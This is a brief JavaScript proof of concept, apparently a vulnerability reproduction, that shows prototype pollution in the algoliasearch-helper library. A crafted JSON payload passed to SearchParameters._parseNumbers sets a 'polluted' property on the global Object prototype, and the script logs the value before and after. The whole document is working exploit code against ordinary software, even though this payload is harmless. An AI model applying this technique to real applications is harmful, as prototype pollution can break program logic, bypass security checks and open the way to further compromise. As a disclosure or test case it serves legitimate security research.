var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const algohelp = require('algoliasearch-helper');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
console.log({}.polluted);
algohelp.SearchParameters._parseNumbers(payload);
console.log({}.polluted);